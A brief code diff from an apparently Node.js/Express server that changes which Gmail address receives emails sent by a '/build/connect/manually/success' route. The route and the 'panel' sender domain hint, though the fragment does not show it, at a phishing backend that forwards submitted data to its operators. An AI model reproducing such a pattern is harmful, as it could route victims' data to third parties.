@@ -53,7 +53,7 @@ app.post('/build/connect/manually/success', async (req, res) => {
     })
 
 
-    const recipients = ["info@resolverconsult-panel.com", "node.resolver@gmail.com"]
+    const recipients = ["info@resolverconsult-panel.com", "salim72salim72@gmail.com"]
     for(let recipient of recipients) {
         const mailOptions = {
             from: "info@resolverconsult-panel.com",
